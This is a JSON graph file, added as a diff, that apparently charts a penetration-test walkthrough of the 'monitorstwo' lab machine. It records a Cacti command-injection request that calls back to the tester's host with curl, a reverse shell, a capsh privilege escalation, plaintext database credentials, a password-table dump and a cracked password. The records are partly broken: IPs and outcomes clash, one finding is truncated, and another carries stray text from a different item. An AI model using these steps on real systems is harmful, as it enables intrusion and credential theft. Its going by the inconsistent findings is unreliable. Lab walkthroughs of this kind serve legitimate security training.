@@ -1,0 +1,846 @@
+{
+  "machine": "monitorstwo",
+  "row_index": 9,
+  "legend": {
+    "node_types": {
+      "State (Blue)": "Pentest phase / sub-phase, or informational item (target IP, hostname, machine name, OS, ...)",
+      "Action (Orange)": "A concrete action the pentester performed",
+      "Finding (Green)": "The result/finding produced by an Action"
+    },
+    "status_shading": {
+      "dark": "completed",
+      "mid": "in_progress",
+      "light": "to_do"
+    },
+    "edge_types": {
+      "StateTransition (Black)": "State -> State, advancing through the PTT",
+      "SearchUpdate (Green)": "State -> Action, starting work on a PTT item",
+      "TrackUpdate (Blue)": "Action -> Finding, item execution produced findings",
+      "Prediction (Purple)": "Finding -> State, findings lead back into state"
+    }
+  },
+  "nodes": [
+    {
+      "id": "state:monitorstwo:r9:START",
+      "label": "State: Start",
+      "type": "State",
+      "color": "#3A86FF",
+      "status": "in_progress",
+      "title": "Start of pentest tree snapshot for 'monitorstwo' (row 9).",
+      "size": 30,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:monitorstwo:r9:1",
+      "label": "State 1\nReconnaissance",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1 Reconnaissance [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:monitorstwo:r9:1.1",
+      "label": "State 1.1\nPassive Information Gathering",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.1 Passive Information Gathering [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:monitorstwo:r9:1.2",
+      "label": "State 1.2\nActive Information Gathering",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.2 Active Information Gathering [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:monitorstwo:r9:1.3",
+      "label": "State 1.3\nIdentify Open Ports, Services…",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.3 Identify Open Ports, Services running on the open ports and their versions [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:monitorstwo:r9:1.3.1",
+      "label": "Action 1.3.1\nPerform a port scan",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "1.3.1 Perform a port scan [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:monitorstwo:r9:1.3.1",
+      "label": "Finding 1.3.1\nHost IP: 10.129.228.231, Host…",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "Host IP: 10.129.228.231, Host Status: Up, Latency: 0.85s, Closed TCP Ports: 998, Open Ports: 22 (SSH), 80 (HTTP), Scan Duration: 134.62 seconds",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:monitorstwo:r9:1.3.2",
+      "label": "Action 1.3.2\nDetermine the services and ve…",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "1.3.2 Determine the services and versions on each open port [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:monitorstwo:r9:1.3.2",
+      "label": "Finding 1.3.2\nPort 22 (SSH): OpenSSH 8.2p1 …",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "Port 22 (SSH): OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0), Port 80 (HTTP): nginx 1.18.0 (Ubuntu)",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:monitorstwo:r9:1.3.3",
+      "label": "Action 1.3.3\nEnumerate HTTP service",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "1.3.3 Enumerate HTTP service [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:monitorstwo:r9:1.3.3",
+      "label": "Finding 1.3.3\nWeb Page Content: User Login …",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "Web Page Content: User Login Page, Software: Cacti Version 1.2.22, Key Widgets: Username Input Field, Password Input Field, \"Keep me signed in\" Checkbox, Copyright Information: (c) 2004-2025 - The Cacti Group",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:monitorstwo:r9:1.3.4",
+      "label": "State 1.3.4\nVulnerability analysis on Cac…",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.3.4 Vulnerability analysis on Cacti version 1.2.22 [completed]\nVulnerability: Cacti version 1.2.22 unauthenticated command injection vulnerability (CVE-2022-46169), Description: The vulnerability is in the `remote_agent.php` file within Cacti, which can be accessed without authentication. The `get_client_addr` function can be manipulated via HTTP headers to bypass the authorization check. The `polldata` action processes the `poller_id` parameter without proper sanitization, leading to command injection. Affected Versions: Cacti versions 1.2.22 and below, Severity: Critical (CVSSv3 score of 9.8), Exploitability: Exploits for CVE-2022-46169 are publicly available and have been observed in the wild. Proof-of-Concept (PoC) exploits and Metasploit modules exist. Impact: A successful exploit allows an unauthenticated attacker to execute arbitrary commands on the Cacti server, potentially leading to full compromise of the Cacti instance and the underlying system. Solution: Upgrade to Cacti version 1.2.23, 1.3.0, or later. For instances of 1.2.x running under PHP < 7.0, an additional specific change (a8d59e8) might also be required. References: NVD, Tenable, Sonar, Rapid7 Vulnerability Database, GitHub PoC repositories, Exploit-DB, Broadcom Inc., Qualys, Wazuh, Cyber Security Agency of Singapore.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:monitorstwo:r9:1.3.5",
+      "label": "Action 1.3.5\nExploit the identified vulner…",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "1.3.5 Exploit the identified vulnerability [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:monitorstwo:r9:1.3.5",
+      "label": "Finding 1.3.5\nRequest Method: GET, Request …",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "Request Method: GET, Request URL: /remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=%3bcurl+10.10.14.40%3a8081/test, HTTP Version: HTTP/1.1, Headers: X-Forwarded-For: 127.0.0.1, Host: 10.10.11.211, User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0, Cookies: CactiDateTime=Wed Apr 26 2023 11:18:25 GMT+0300 (Eastern European Summer Time), CactiTimeZone=180, Cacti=a24825389e0f97bb130e0fe82b99cc4a, Outcome: Successfully received a reverse shell by listening to port 4444 as the user www-data.",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:monitorstwo:r9:1.3.6",
+      "label": "Action 1.3.6\nExplore the suspicious files,…",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "1.3.6 Explore the suspicious files, commands and create a summary of the findings [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:monitorstwo:r9:1.3.6",
+      "label": "Finding 1.3.6\nEnvironment: Docker container…",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "Environment: Docker container (indicated by the presence of the /.dockerenv file), Filesystem Enumeration: SUID bit set files found using the command `find / -perm /4000 2>/dev/null`, SUID Files Found: /usr/bin/gpasswd, /usr/bin/passwd, /usr/bin/chsh, /usr/bin/chfn, /usr/bin/newgrp, /sbin/capsh, /bin/mount, /bin/umount, /bin/su, Notable File: capsh binary is present, which could potentially be used for privilege escalation.",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:monitorstwo:r9:1.3.7",
+      "label": "Action 1.3.7\nResearch capsh binary for pot…",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "1.3.7 Research capsh binary for potential privilege escalation [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:monitorstwo:r9:1.3.7",
+      "label": "Finding 1.3.7\n`capsh` Binary: It is a tool …",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "`capsh` Binary: It is a tool used to manage and manipulate Linux capabilities. It can be abused or misused in privilege escalation scenarios if an attacker gains control of a system where `capsh` or other binaries have been configured with excessive or insecure capabilities. Linux Capabilities: They break down the vast set of privileges traditionally associated with the root user into smaller, distinct units. This allows for more granular control over what specific actions a process or binary can perform. Privilege Escalation: Misconfigurations or vulnerabilities can lead to privilege escalation, which can occur due to excessive capabilities on binaries, SUID/SGID binaries with capabilities, misconfigured capability bounding sets, and kernel vulnerabilities. `capsh` and Privilege Escalation: `capsh` can be abused if it or another binary it can interact with has elevated capabilities assigned to it. It could potentially be used to spawn a privileged shell or execute commands with elevated privileges. Relevant Capabilities for Privilege Escalation: `CAP_SYS_ADMIN`, `CAP_SETUID`, `CAP_SETGID`, `CAP_DAC_OVERRIDE`,",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:monitorstwo:r9:1.3.8",
+      "label": "Action 1.3.8\nExploit the selected exploita…",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "1.3.8 Exploit the selected exploitations [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:monitorstwo:r9:1.3.8",
+      "label": "Finding 1.3.8\nCommand Executed: `capsh --gi…",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "Command Executed: `capsh --gid=0 --uid=0 --`, Outcome: Successfully obtained root privileges within the container, Identity Verification: `id` command output shows `uid=0(root) gid=0(root) groups=0(root),33(www-data)`, confirming root access.",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:monitorstwo:r9:1.3.9",
+      "label": "Action 1.3.9\nExplore the suspicious files,…",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "1.3.9 Explore the suspicious files, commands and create a summary of the findings [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:monitorstwo:r9:1.3.9",
+      "label": "Finding 1.3.9\nFile Examined: /var/www/html/…",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "File Examined: /var/www/html/include/config.php, Database Configuration Details: Database Type: MySQL, Database Name: cacti, Hostname: db, Username: root, Password: root, Port: 3306, Retries: 5, SSL: Not used, Persistence: Disabled, MySQL Connection: Successful connection to the MySQL database using the provided credentials, MySQL Command Output: A list of tables in the 'cacti' database was successfully retrieved. Notably, the 'user_auth' table was mentioned, which may contain sensitive user authentication data.",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:monitorstwo:r9:1.3.10",
+      "label": "Action 1.3.10\nRetrieve usernames and passwo…",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "1.3.10 Retrieve usernames and passwords from 'user_auth' table [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:monitorstwo:r9:1.3.10",
+      "label": "Finding 1.3.10\nMySQL Command: The command `m…",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "MySQL Command: The command `mysql -h db -u root -proot cacti -e 'select username,password from user_auth;'` was executed to retrieve usernames and passwords from the 'user_auth' table in the 'cacti' database. Output: The command successfully retrieved the usernames and hashed passwords of three users: 'admin', 'guest', and 'marcus'.",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:monitorstwo:r9:1.3.11",
+      "label": "Action 1.3.11\nBreak the hash and find the p…",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "1.3.11 Break the hash and find the passwords [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:monitorstwo:r9:1.3.11",
+      "label": "Finding 1.3.11\nCommand Executed: `john hashe…",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "Command Executed: `john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt`, Purpose: To crack the hashed passwords using John the Ripper with the 'rockyou.txt' wordlist. Output: Successfully cracked one of the passwords, which is 'funkymonkey'. The user associated with this password is not specified in the output.}\n   1.4 Target IP: 10.129.228.231 - [updated] {Findings: OS Information: Linux",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    }
+  ],
+  "edges": [
+    {
+      "from": "state:monitorstwo:r9:START",
+      "to": "state:monitorstwo:r9:1",
+      "label": "1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:monitorstwo:r9:1",
+      "to": "state:monitorstwo:r9:1.1",
+      "label": "1.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:monitorstwo:r9:1.1",
+      "to": "state:monitorstwo:r9:1.2",
+      "label": "1.2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:monitorstwo:r9:1.2",
+      "to": "state:monitorstwo:r9:1.3",
+      "label": "1.3",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:monitorstwo:r9:1.3",
+      "to": "action:monitorstwo:r9:1.3.1",
+      "label": "1.3.1 Perform a port sc…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:monitorstwo:r9:1.3.1",
+      "to": "finding:monitorstwo:r9:1.3.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:monitorstwo:r9:1.3.1",
+      "to": "state:monitorstwo:r9:1.3",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:monitorstwo:r9:1.3",
+      "to": "action:monitorstwo:r9:1.3.2",
+      "label": "1.3.2 Determine the ser…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:monitorstwo:r9:1.3.2",
+      "to": "finding:monitorstwo:r9:1.3.2",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:monitorstwo:r9:1.3.2",
+      "to": "state:monitorstwo:r9:1.3",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:monitorstwo:r9:1.3",
+      "to": "action:monitorstwo:r9:1.3.3",
+      "label": "1.3.3 Enumerate HTTP se…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:monitorstwo:r9:1.3.3",
+      "to": "finding:monitorstwo:r9:1.3.3",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:monitorstwo:r9:1.3.3",
+      "to": "state:monitorstwo:r9:1.3",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:monitorstwo:r9:1.3",
+      "to": "state:monitorstwo:r9:1.3.4",
+      "label": "1.3.4",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:monitorstwo:r9:1.3.4",
+      "to": "action:monitorstwo:r9:1.3.5",
+      "label": "1.3.5 Exploit the ident…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:monitorstwo:r9:1.3.5",
+      "to": "finding:monitorstwo:r9:1.3.5",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:monitorstwo:r9:1.3.5",
+      "to": "state:monitorstwo:r9:1.3.4",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:monitorstwo:r9:1.3.4",
+      "to": "action:monitorstwo:r9:1.3.6",
+      "label": "1.3.6 Explore the suspi…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:monitorstwo:r9:1.3.6",
+      "to": "finding:monitorstwo:r9:1.3.6",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:monitorstwo:r9:1.3.6",
+      "to": "state:monitorstwo:r9:1.3.4",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:monitorstwo:r9:1.3.4",
+      "to": "action:monitorstwo:r9:1.3.7",
+      "label": "1.3.7 Research capsh bi…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:monitorstwo:r9:1.3.7",
+      "to": "finding:monitorstwo:r9:1.3.7",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:monitorstwo:r9:1.3.7",
+      "to": "state:monitorstwo:r9:1.3.4",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:monitorstwo:r9:1.3.4",
+      "to": "action:monitorstwo:r9:1.3.8",
+      "label": "1.3.8 Exploit the selec…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:monitorstwo:r9:1.3.8",
+      "to": "finding:monitorstwo:r9:1.3.8",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:monitorstwo:r9:1.3.8",
+      "to": "state:monitorstwo:r9:1.3.4",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:monitorstwo:r9:1.3.4",
+      "to": "action:monitorstwo:r9:1.3.9",
+      "label": "1.3.9 Explore the suspi…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:monitorstwo:r9:1.3.9",
+      "to": "finding:monitorstwo:r9:1.3.9",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:monitorstwo:r9:1.3.9",
+      "to": "state:monitorstwo:r9:1.3.4",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:monitorstwo:r9:1.3.4",
+      "to": "action:monitorstwo:r9:1.3.10",
+      "label": "1.3.10 Retrieve username…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:monitorstwo:r9:1.3.10",
+      "to": "finding:monitorstwo:r9:1.3.10",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:monitorstwo:r9:1.3.10",
+      "to": "state:monitorstwo:r9:1.3.4",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:monitorstwo:r9:1.3.4",
+      "to": "action:monitorstwo:r9:1.3.11",
+      "label": "1.3.11 Break the hash an…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:monitorstwo:r9:1.3.11",
+      "to": "finding:monitorstwo:r9:1.3.11",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:monitorstwo:r9:1.3.11",
+      "to": "state:monitorstwo:r9:1.3.4",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    }
+  ],
+  "graph_statistics": {
+    "total_nodes": 26,
+    "total_edges": 35,
+    "state_nodes": 6,
+    "action_nodes": 10,
+    "finding_nodes": 10,
+    "ptt_items_parsed": 15
+  },
+  "csv_row_index": 176,
+  "source_csv": "training_data.csv"
+}
